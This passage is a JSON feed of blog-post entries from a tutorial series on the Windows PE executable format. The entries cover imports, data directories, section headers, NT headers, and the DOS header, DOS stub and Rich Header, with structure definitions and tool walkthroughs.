          "description": "A dive into the PE file format - PE file structure - Part 5: PE Imports (Import Directory Table, ILT, IAT) Introduction In this post we’re going to talk about a very important aspect of PE files, the PE imports. To understand how PE files handle their imports, we’ll go over some of the Data Directories present in the Import Data section (.idata), the Import Directory Table, the Import Lookup Table (ILT) or also referred to as the Import Name Table (INT) and the Import Address Table (IAT). Import Directory Table The Import Directory Table is a Data Directory located at the beginning of the .idata section. It consists of an array of IMAGE_IMPORT_DESCRIPTOR structures, each one of them is for a DLL. It doesn’t have a fixed size, so the last IMAGE_IMPORT_DESCRIPTOR of the array is zeroed-out (NULL-Padded) to indicate the end of the Import Directory Table. IMAGE_IMPORT_DESCRIPTOR is defined as follows: typedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; } DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; DWORD FirstThunk; } IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; OriginalFirstThunk: RVA of the ILT. TimeDateStamp: A time date stamp, that’s initially set to 0 if not bound and set to -1 if bound. In case of an unbound import the time date stamp gets updated to the time date stamp of the DLL after the image is bound. In case of a bound import it stays set to -1 and the real time date stamp of the DLL can be found in the Bound Import Directory Table in the corresponding IMAGE_BOUND_IMPORT_DESCRIPTOR . We’ll discuss bound imports in the next section. ForwarderChain: The index of the first forwarder chain reference. This is something responsible for DLL forwarding. (DLL forwarding is when a DLL forwards some of its exported functions to another DLL.) Name: An RVA of an ASCII string that contains the name of the imported DLL. FirstThunk: RVA of the IAT. Bound Imports A bound import essentially means that the import table contains fixed addresses for the imported functions. These addresses are calculated and written during compile time by the linker. Using bound imports is a speed optimization, it reduces the time needed by the loader to resolve function addresses and fill the IAT, however if at run-time the bound addresses do not match the real ones then the loader will have to resolve these addresses again and fix the IAT. When discussing IMAGE_IMPORT_DESCRIPTOR.TimeDateStamp, I mentioned that in case of a bound import, the time date stamp is set to -1 and the real time date stamp of the DLL can be found in the corresponding IMAGE_BOUND_IMPORT_DESCRIPTOR in the Bound Import Data Directory. Bound Import Data Directory The Bound Import Data Directory is similar to the Import Directory Table, however as the name suggests, it holds information about the bound imports. It consists of an array of IMAGE_BOUND_IMPORT_DESCRIPTOR structures, and ends with a zeroed-out IMAGE_BOUND_IMPORT_DESCRIPTOR. IMAGE_BOUND_IMPORT_DESCRIPTOR is defined as follows: typedef struct _IMAGE_BOUND_IMPORT_DESCRIPTOR { DWORD TimeDateStamp; WORD OffsetModuleName; WORD NumberOfModuleForwarderRefs; // Array of zero or more IMAGE_BOUND_FORWARDER_REF follows } IMAGE_BOUND_IMPORT_DESCRIPTOR, *PIMAGE_BOUND_IMPORT_DESCRIPTOR; TimeDateStamp: The time date stamp of the imported DLL. OffsetModuleName: An offset to a string with the name of the imported DLL. It’s an offset from the first IMAGE_BOUND_IMPORT_DESCRIPTOR NumberOfModuleForwarderRefs: The number of the IMAGE_BOUND_FORWARDER_REF structures that immediately follow this structure. IMAGE_BOUND_FORWARDER_REF is a structure that’s identical to IMAGE_BOUND_IMPORT_DESCRIPTOR, the only difference is that the last member is reserved. That’s all we need to know about bound imports. Import Lookup Table (ILT) Sometimes people refer to it as the Import Name Table (INT). Every imported DLL has an Import Lookup Table. IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk holds the RVA of the ILT of the corresponding DLL. The ILT is essentially a table of names or references, it tells the loader which functions are needed from the imported DLL. The ILT consists of an array of 32-bit numbers (for PE32) or 64-bit numbers for (PE32+), the last one is zeroed-out to indicate the end of the ILT. Each entry of these entries encodes information as follows: Bit 31/63 (most significant bit): This is called the Ordinal/Name flag, it specifies whether to import the function by name or by ordinal. Bits 15-0: If the Ordinal/Name flag is set to 1 these bits are used to hold the 16-bit ordinal number that will be used to import the function, bits 30-15/62-15 for PE32/PE32+ must be set to 0. Bits 30-0: If the Ordinal/Name flag is set to 0 these bits are used to hold an RVA of a Hint/Name table. Hint/Name Table A Hint/Name table is a structure defined in winnt.h as IMAGE_IMPORT_BY_NAME: typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; CHAR Name[1]; } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; Hint: A word that contains a number, this number is used to look-up the function, that number is first used as an index into the export name pointer table, if that initial check fails a binary search is performed on the DLL’s export name pointer table. Name: A null-terminated string that contains the name of the function to import. Import Address Table (IAT) On disk, the IAT is identical to the ILT, however during bounding when the binary is being loaded into memory, the entries of the IAT get overwritten with the addresses of the functions that are being imported. Summary So to summarize what we discussed in this post, for every DLL the executable is loading functions from, there will be an IMAGE_IMPORT_DESCRIPTOR within the Image Directory Table. The IMAGE_IMPORT_DESCRIPTOR will contain the name of the DLL, and two fields holding RVAs of the ILT and the IAT. The ILT will contain references for all the functions that are being imported from the DLL. The IAT will be identical to the ILT until the executable is loaded in memory, then the loader will fill the IAT with the actual addresses of the imported functions. If the DLL import is a bound import, then the import information will be contained in IMAGE_BOUND_IMPORT_DESCRIPTOR structures in a separate Data Directory called the Bound Import Data Directory. Let’s take a quick look at the import information inside of an actual PE file. Here’s the Import Directory Table of the executable: All of these entries are IMAGE_IMPORT_DESCRIPTORs. As you can see, the TimeDateStamp of all the imports is set to 0, meaning that none of these imports are bound, this is also confirmed in the Bound? column added by PE-bear. For example, if we take USER32.dll and follow the RVA of its ILT (referenced by OriginalFirstThunk), we’ll find only 1 entry (because only one function is imported), and that entry looks like this: This is a 64-bit executable, so the entry is 64 bits long. As you can see, the last byte is set to 0, indicating that a Hint/Table name should be used to look-up the function. We know that the RVA of this Hint/Table name should be referenced by the first 2 bytes, so we should follow RVA 0x29F8: Now we’re looking at an IMAGE_IMPORT_BY_NAME structure, first two bytes hold the hint, which in this case is 0x283, the rest of the structure holds the full name of the function which is MessageBoxA. We can verify that our interpretation of the data is correct by looking at how PE-bear parsed it, and we’ll see the same results: Conclusion That’s all I have to say about PE imports, in the next post I’ll discuss PE base relocations. Thanks for reading.",
          "link": "https://0xrick.github.io/win-internals/pe6/",
          "publishedOn": "2021-10-28T01:00:00.000Z",
          "wordCount": 1460,
          "title": "A dive into the PE file format - PE file structure - Part 5: PE Imports (Import Directory Table, ILT, IAT)",
          "imageUrl": null
        },
        {
          "id": "https://0xrick.github.io/win-internals/pe5/",
          "author": null,
          "description": "A dive into the PE file format - PE file structure - Part 4: Data Directories, Section Headers and Sections Introduction In the last post we talked about the NT Headers and we skipped the last part of the Optional Header which was the data directories. In this post we’re going to talk about what data directories are and where they are located. We’re also going to cover section headers and sections in this post. Data Directories The last member of the IMAGE_OPTIONAL_HEADER structure was an array of IMAGE_DATA_DIRECTORY structures defined as follows: IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; IMAGE_NUMBEROF_DIRECTORY_ENTRIES is a constant defined with the value 16, meaning that this array can have up to 16 IMAGE_DATA_DIRECTORY entries: #define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16 An IMAGE_DATA_DIRETORY structure is defines as follows: typedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; It’s a very simple structure with only two members, first one being an RVA pointing to the start of the Data Directory and the second one being the size of the Data Directory. So what is a Data Directory? Basically a Data Directory is a piece of data located within one of the sections of the PE file. Data Directories contain useful information needed by the loader, an example of a very important directory is the Import Directory which contains a list of external functions imported from other libraries, we’ll discuss it in more detail when we go over PE imports. Please note that not all Data Directories have the same structure, the IMAGE_DATA_DIRECTORY.VirtualAddress points to the Data Directory, however the type of that directory is what determines how that chunk of data is going to be parsed. Here’s a list of Data Directories defined in winnt.h. (Each one of these values represents an index in the DataDirectory array): // Directory Entries #define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory #define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory #define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory #define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory #define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory #define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table #define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory // IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage) #define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data #define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP #define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory #define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers #define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table #define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors #define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor If we take a look at the contents of IMAGE_OPTIONAL_HEADER.DataDirectory of an actual PE file, we might see entries where both fields are set to 0: This means that this specific Data Directory is not used (doesn’t exist) in the executable file. Sections and Section Headers Sections Sections are the containers of the actual data of the executable file, they occupy the rest of the PE file after the headers, precisely after the section headers. Some sections have special names that indicate their purpose, we’ll go over some of them, and a full list of these names can be found on the official Microsoft documentation under the “Special Sections” section. .text: Contains the executable code of the program. .data: Contains the initialized data. .bss: Contains uninitialized data. .rdata: Contains read-only initialized data. .edata: Contains the export tables. .idata: Contains the import tables. .reloc: Contains image relocation information. .rsrc: Contains resources used by the program, these include images, icons or even embedded binaries. .tls: (Thread Local Storage), provides storage for every executing thread of the program. Section Headers After the Optional Header and before the sections comes the Section Headers. These headers contain information about the sections of the PE file. A Section Header is a structure named IMAGE_SECTION_HEADER defined in winnt.h as follows: typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; Name: First field of the Section Header, a byte array of the size IMAGE_SIZEOF_SHORT_NAME that holds the name of the section. IMAGE_SIZEOF_SHORT_NAME has the value of 8 meaning that a section name can’t be longer than 8 characters. For longer names the official documentation mentions a work-around by filling this field with an offset in the string table, however executable images do not use a string table so this limitation of 8 characters holds for executable images. PhysicalAddress or VirtualSize: A union defines multiple names for the same thing, this field contains the total size of the section when it’s loaded in memory. VirtualAddress: The documentation states that for executable images this field holds the address of the first byte of the section relative to the image base when loaded in memory, and for object files it holds the address of the first byte of the section before relocation is applied. SizeOfRawData: This field contains the size of the section on disk, it must be a multiple of IMAGE_OPTIONAL_HEADER.FileAlignment. SizeOfRawData and VirtualSize can be different, we’ll discuss the reason for this later in the post. PointerToRawData: A pointer to the first page of the section within the file, for executable images it must be a multiple of IMAGE_OPTIONAL_HEADER.FileAlignment. PointerToRelocations: A file pointer to the beginning of relocation entries for the section. It’s set to 0 for executable files. PointerToLineNumbers: A file pointer to the beginning of COFF line-number entries for the section. It’s set to 0 because COFF debugging information is deprecated. NumberOfRelocations: The number of relocation entries for the section, it’s set to 0 for executable images. NumberOfLinenumbers: The number of COFF line-number entries for the section, it’s set to 0 because COFF debugging information is deprecated. Characteristics: Flags that describe the characteristics of the section. These characteristics are things like if the section contains executable code, contains initialized/uninitialized data, can be shared in memory. A complete list of section characteristics flags can be found on the official Microsoft documentation. SizeOfRawData and VirtualSize can be different, and this can happen for multiple of reasons. SizeOfRawData must be a multiple of IMAGE_OPTIONAL_HEADER.FileAlignment, so if the section size is less than that value the rest gets padded and SizeOfRawData gets rounded to the nearest multiple of IMAGE_OPTIONAL_HEADER.FileAlignment. However when the section is loaded into memory it doesn’t follow that alignment and only the actual size of the section is occupied. In this case SizeOfRawData will be greater than VirtualSize The opposite can happen as well. If the section contains uninitialized data, these data won’t be accounted for on disk, but when the section gets mapped into memory, the section will expand to reserve memory space for when the uninitialized data gets later initialized and used. This means that the section on disk will occupy less than it will do in memory, in this case VirtualSize will be greater than SizeOfRawData. Here’s the view of Section Headers in PE-bear: We can see Raw Addr. and Virtual Addr. fields which correspond to IMAGE_SECTION_HEADER.PointerToRawData and IMAGE_SECTION_HEADER.VirtualAddress. Raw Size and Virtual Size correspond to IMAGE_SECTION_HEADER.SizeOfRawData and IMAGE_SECTION_HEADER.VirtualSize. We can see how these two fields are used to calculate where the section ends, both on disk and in memory. For example if we take the .text section, it has a raw address of 0x400 and a raw size of 0xE00, if we add them together we get 0x1200 which is displayed as the section end on disk. Similarly we can do the same with virtual size and address, virtual address is 0x1000 and virtual size is 0xD2C, if we add them together we get 0x1D2C. The Characteristics field marks some sections as read-only, some other sections as read-write and some sections as readable and executable. PointerToRelocations, NumberOfRelocations and NumberOfLinenumbers are set to 0 as expected. Conclusion That’s it for this post, we’ve discussed what Data Directories are and we talked about sections. The next post will be about PE imports. Thanks for reading.",
          "link": "https://0xrick.github.io/win-internals/pe5/",
          "publishedOn": "2021-10-27T01:00:00.000Z",
          "wordCount": 1521,
          "title": "A dive into the PE file format - PE file structure - Part 4: Data Directories, Section Headers and Sections",
          "imageUrl": null
        },
        {
          "id": "https://0xrick.github.io/win-internals/pe4/",
          "author": null,
          "description": "A dive into the PE file format - PE file structure - Part 3: NT Headers Introduction In the previous post we looked at the structure of the DOS header and we reversed the DOS stub. In this post we’re going to talk about the NT Headers part of the PE file structure. Before we get into the post, we need to talk about an important concept that we’re going to see a lot, and that is the concept of a Relative Virtual Address or an RVA. An RVA is just an offset from where the image was loaded in memory (the Image Base). So to translate an RVA into an absolute virtual address you need to add the value of the RVA to the value of the Image Base. PE files rely heavily on the use of RVAs as we’ll see later. NT Headers (IMAGE_NT_HEADERS) NT headers is a structure defined in winnt.h as IMAGE_NT_HEADERS, by looking at its definition we can see that it has three members, a DWORD signature, an IMAGE_FILE_HEADER structure called FileHeader and an IMAGE_OPTIONAL_HEADER structure called OptionalHeader. It’s worth mentioning that this structure is defined in two different versions, one for 32-bit executables (Also named PE32 executables) named IMAGE_NT_HEADERS and one for 64-bit executables (Also named PE32+ executables) named IMAGE_NT_HEADERS64. The main difference between the two versions is the used version of IMAGE_OPTIONAL_HEADER structure which has two versions, IMAGE_OPTIONAL_HEADER32 for 32-bit executables and IMAGE_OPTIONAL_HEADER64 for 64-bit executables. typedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; typedef struct _IMAGE_NT_HEADERS { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader; } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; Signature First member of the NT headers structure is the PE signature, it’s a DWORD which means that it occupies 4 bytes. It always has a fixed value of 0x50450000 which translates to PE\\0\\0 in ASCII. Here’s a screenshot from PE-bear showing the PE signature: File Header (IMAGE_FILE_HEADER) Also called “The COFF File Header”, the File Header is a structure that holds some information about the PE file. It’s defined as IMAGE_FILE_HEADER in winnt.h, here’s the definition: typedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; It’s a simple structure with 7 members: Machine: This is a number that indicates the type of machine (CPU Architecture) the executable is targeting, this field can have a lot of values, but we’re only interested in two of them, 0x8864 for AMD64 and 0x14c for i386. For a complete list of possible values you can check the official Microsoft documentation. NumberOfSections: This field holds the number of sections (or the number of section headers aka. the size of the section table.). TimeDateStamp: A unix timestamp that indicates when the file was created. PointerToSymbolTable and NumberOfSymbols: These two fields hold the file offset to the COFF symbol table and the number of entries in that symbol table, however they get set to 0 which means that no COFF symbol table is present, this is done because the COFF debugging information is deprecated. SizeOfOptionalHeader: The size of the Optional Header. Characteristics: A flag that indicates the attributes of the file, these attributes can be things like the file being executable, the file being a system file and not a user program, and a lot of other things. A complete list of these flags can be found on the official Microsoft documentation. Here’s the File Header contents of an actual PE file: Optional Header (IMAGE_OPTIONAL_HEADER) The Optional Header is the most important header of the NT headers, the PE loader looks for specific information provided by that header to be able to load and run the executable. It’s called the optional header because some file types like object files don’t have it, however this header is essential for image files. It doesn’t have a fixed size, that’s why the IMAGE_FILE_HEADER.SizeOfOptionalHeader member exists. The first 8 members of the Optional Header structure are standard for every implementation of the COFF file format, the rest of the header is an extension to the standard COFF optional header defined by Microsoft, these additional members of the structure are needed by the Windows PE loader and linker. As mentioned earlier, there are two versions of the Optional Header, one for 32-bit executables and one for 64-bit executables. The two versions are different in two aspects: The size of the structure itself (or the number of members defined within the structure): IMAGE_OPTIONAL_HEADER32 has 31 members while IMAGE_OPTIONAL_HEADER64 only has 30 members, that additional member in the 32-bit version is a DWORD named BaseOfData which holds an RVA of the beginning of the data section. The data type of some of the members: The following 5 members of the Optional Header structure are defined as DWORD in the 32-bit version and as ULONGLONG in the 64-bit version: ImageBase SizeOfStackReserve SizeOfStackCommit SizeOfHeapReserve SizeOfHeapCommit Let’s take a look at the definition of both structures. typedef struct _IMAGE_OPTIONAL_HEADER { // // Standard fields. // WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; // // NT additional fields. // DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64; Magic: Microsoft documentation describes this field as an integer that identifies the state of the image, the documentation mentions three common values: 0x10B: Identifies the image as a PE32 executable. 0x20B: Identifies the image as a PE32+ executable. 0x107: Identifies the image as a ROM image. The value of this field is what determines whether the executable is 32-bit or 64-bit, IMAGE_FILE_HEADER.Machine is ignored by the Windows PE loader. MajorLinkerVersion and MinorLinkerVersion: The linker major and minor version numbers. SizeOfCode: This field holds the size of the code (.text) section, or the sum of all code sections if there are multiple sections. SizeOfInitializedData: This field holds the size of the initialized data (.data) section, or the sum of all initialized data sections if there are multiple sections. SizeOfUninitializedData: This field holds the size of the uninitialized data (.bss) section, or the sum of all uninitialized data sections if there are multiple sections. AddressOfEntryPoint: An RVA of the entry point when the file is loaded into memory. The documentation states that for program images this relative address points to the starting address and for device drivers it points to initialization function. For DLLs an entry point is optional, and in the case of entry point absence the AddressOfEntryPoint field is set to 0. BaseOfCode: An RVA of the start of the code section when the file is loaded into memory. BaseOfData (PE32 Only): An RVA of the start of the data section when the file is loaded into memory. ImageBase: This field holds the preferred address of the first byte of image when loaded into memory (the preferred base address), this value must be a multiple of 64K. Due to memory protections like ASLR, and a lot of other reasons, the address specified by this field is almost never used, in this case the PE loader chooses an unused memory range to load the image into, after loading the image into that address the loader goes into a process called the relocating where it fixes the constant addresses within the image to work with the new image base, there’s a special section that holds information about places that will need fixing if relocation is needed, that section is called the relocation section (.reloc), more on that in the upcoming posts. SectionAlignment: This field holds a value that gets used for section alignment in memory (in bytes), sections are aligned in memory boundaries that are multiples of this value. The documentation states that this value defaults to the page size for the architecture and it can’t be less than the value of FileAlignment. FileAlignment: Similar to SectionAligment this field holds a value that gets used for section raw data alignment on disk (in bytes), if the size of the actual data in a section is less than the FileAlignment value, the rest of the chunk gets padded with zeroes to keep the alignment boundaries. The documentation states that this value should be a power of 2 between 512 and 64K, and if the value of SectionAlignment is less than the architecture’s page size then the sizes of FileAlignment and SectionAlignment must match. MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion, MajorSubsystemVersion and MinorSubsystemVersion: These members of the structure specify the major version number of the required operating system, the minor version number of the required operating system, the major version number of the image, the minor version number of the image, the major version number of the subsystem and the minor version number of the subsystem respectively. Win32VersionValue: A reserved field that the documentation says should be set to 0. SizeOfImage: The size of the image file (in bytes), including all headers. It gets rounded up to a multiple of SectionAlignment because this value is used when loading the image into memory. SizeOfHeaders: The combined size of the DOS stub, PE header (NT Headers), and section headers rounded up to a multiple of FileAlignment. CheckSum: A checksum of the image file, it’s used to validate the image at load time. Subsystem: This field specifies the Windows subsystem (if any) that is required to run the image, A complete list of the possible values of this field can be found on the official Microsoft documentation. DLLCharacteristics: This field defines some characteristics of the executable image file, like if it’s NX compatible and if it can be relocated at run time. I have no idea why it’s named DLLCharacteristics, it exists within normal executable image files and it defines characteristics that can apply to normal executable files. A complete list of the possible flags for DLLCharacteristics can be found on the official Microsoft documentation. SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve and SizeOfHeapCommit: These fields specify the size of the stack to reserve, the size of the stack to commit, the size of the local heap space to reserve and the size of the local heap space to commit respectively. LoaderFlags: A reserved field that the documentation says should be set to 0. NumberOfRvaAndSizes : Size of the DataDirectory array. DataDirectory: An array of IMAGE_DATA_DIRECTORY structures. We will talk about this in the next post. Let’s take a look at the Optional Header contents of an actual PE file. We can talk about some of these fields, first one being the Magic field at the start of the header, it has the value 0x20B meaning that this is a PE32+ executable. We can see that the entry point RVA is 0x12C4 and the code section start RVA is 0x1000, it follows the alignment defined by the SectionAlignment field which has the value of 0x1000. File alignment is set to 0x200, and we can verify this by looking at any of the sections, for example the data section: As you can see, the actual contents of the data section are from 0x2200 to 0x2229, however the rest of the section is padded until 0x23FF to comply with the alignment defined by FileAlignment. SizeOfImage is set to 7000 and SizeOfHeaders is set to 400, both are multiples of SectionAlignment and FileAlignment respectively. The Subsystem field is set to 3 which is the Windows console, and that makes sense because the program is a console application. I didn’t include the DataDirectory in the optional header contents screenshot because we still haven’t talked about it yet. Conclusion We’ve reached the end of this post. In summary we looked at the NT Headers structure, and we discussed the File Header and Optional Header structures in detail. In the next post we will take a look at the Data Directories, the Section Headers, and the sections. Thanks for reading.",
          "link": "https://0xrick.github.io/win-internals/pe4/",
          "publishedOn": "2021-10-24T01:00:00.000Z",
          "wordCount": 2261,
          "title": "A dive into the PE file format - PE file structure - Part 3: NT Headers",
          "imageUrl": null
        },
        {
          "id": "https://0xrick.github.io/win-internals/pe3/",
          "author": null,
          "description": "A dive into the PE file format - PE file structure - Part 2: DOS Header, DOS Stub and Rich Header Introduction In the previous post we looked at a high level overview of the PE file structure, in this post we’re going to talk about the first two parts which are the DOS Header and the DOS Stub. The PE viewer I’m going to use throughout the series is called PE-bear, it’s full of features and has a good UI. DOS Header Overview The DOS header (also called the MS-DOS header) is a 64-byte-long structure that exists at the start of the PE file. it’s not important for the functionality of PE files on modern Windows systems, however it’s there because of backward compatibility reasons. This header makes the file an MS-DOS executable, so when it’s loaded on MS-DOS the DOS stub gets executed instead of the actual program. Without this header, if you attempt to load the executable on MS-DOS it will not be loaded and will just produce a generic error. Structure As mentioned before, it’s a 64-byte-long structure, we can take a look at the contents of that structure by looking at the IMAGE_DOS_HEADER structure definition from winnt.h: typedef struct _IMAGE_DOS_HEADER { // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; This structure is important to the PE loader on MS-DOS, however only a few members of it are important to the PE loader on Windows Systems, so we’re not going to cover everything in here, just the important members of the structure. e_magic: This is the first member of the DOS Header, it’s a WORD so it occupies 2 bytes, it’s usually called the magic number. It has a fixed value of 0x5A4D or MZ in ASCII, and it serves as a signature that marks the file as an MS-DOS executable. e_lfanew: This is the last member of the DOS header structure, it’s located at offset 0x3C into the DOS header and it holds an offset to the start of the NT headers. This member is important to the PE loader on Windows systems because it tells the loader where to look for the file header. The following picture shows contents of the DOS header in an actual PE file using PE-bear: As you can see, the first member of the header is the magic number with the fixed value we talked about which was 5A4D. The last member of the header (at offset 0x3C) is given the name “File address of new exe header”, it has the value 100, we can follow to that offset and we’ll find the start of the NT headers as expected: DOS Stub Overview The DOS stub is an MS-DOS program that prints an error message saying that the executable is not compatible with DOS then exits. This is what gets executed when the program is loaded in MS-DOS, the default error message is “This program cannot be run in DOS mode.”, however this message can be changed by the user during compile time. That’s all we need to know about the DOS stub, we don’t really care about it, but let’s take a look at what it’s doing just for fun. Analysis To be able to disassemble the machine code of the DOS stub, I copied the code of the stub from PE-bear, then I created a new file with the stub contents using a hex editor (HxD) and gave it the name dos-stub.exe. Stub code: 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 After that I used IDA to disassemble the executable, MS-DOS programs are 16-bit programs, so I chose the intel 8086 processor type and the 16-bit disassembly mode. It’s a fairly simple program, let’s step through it line by line: seg000:0000 push cs seg000:0001 pop ds First line pushes the value of cs onto the stack and the second line pops that value from the top of stack into ds. This is just a way of setting the value of the data segment to the same value as the code segment. seg000:0002 mov dx, 0Eh seg000:0005 mov ah, 9 seg000:0007 int 21h ; DOS - PRINT STRING seg000:0007 ; DS:DX -&gt; string terminated by \"$\" These three lines are responsible for printing the error message, first line sets dx to the address of the string “This program cannot be run in DOS mode.” (0xe), second line sets ah to 9 and the last line invokes interrupt 21h. Interrupt 21h is a DOS interrupt (API call) that can do a lot of things, it takes a parameter that determines what function to execute and that parameter is passed in the ah register. We see here that the value 9 is given to the interrupt, 9 is the code of the function that prints a string to the screen, that function takes a parameter which is the address of the string to print, that parameter is passed in the dx register as we can see in the code. Information about the DOS API can be found on wikipedia. seg000:0009 mov ax, 4C01h seg000:000C int 21h ; DOS - 2+ - QUIT WITH EXIT CODE (EXIT) seg000:000C ; AL = exit code The last three lines of the program are again an interrupt 21h call, this time there’s a mov instruction that puts 0X4C01 into ax, this sets al to 0x01 and ah to 0x4c. 0x4c is the function code of the function that exits with an error code, it takes the error code from al, which in this case is 1. So in summary, all the DOS stub is doing is print the error message then exit with code 1. Rich Header So now we’ve seen the DOS Header and the DOS Stub, however there’s still a chunk of data we haven’t talked about lying between the DOS Stub and the start of the NT Headers. This chunk of data is commonly referred to as the Rich Header, it’s an undocumented structure that’s only present in executables built using the Microsoft Visual Studio toolset. This structure holds some metadata about the tools used to build the executable like their names or types and their specific versions and build numbers. All of the resources I have read about PE files didn’t mention this structure, however when searching about the Rich Header itself I found a decent amount of resources, and that makes sense because the Rich Header is not actually a part of the PE file format structure and can be completely zeroed-out without interfering with the executable’s functionality, it’s just something that Microsoft adds to any executable built using their Visual Studio toolset. I only know about the Rich Header because I’ve read the reports on the Olympic Destroyer malware, and for those who don’t know what Olympic Destroyer is, it’s a malware that was written and used by a threat group in an attempt to disrupt the 2018 Winter Olympics. This piece of malware is known for having a lot of false flags that were intentionally put to cause confusion and misattribution, one of the false flags present there was a Rich Header. The authors of the malware overwrote the original Rich Header in the malware executable with the Rich Header of another malware attributed to the Lazarus threat group to make it look like it was Lazarus. You can check Kaspersky’s report for more information about this. The Rich Header consists of a 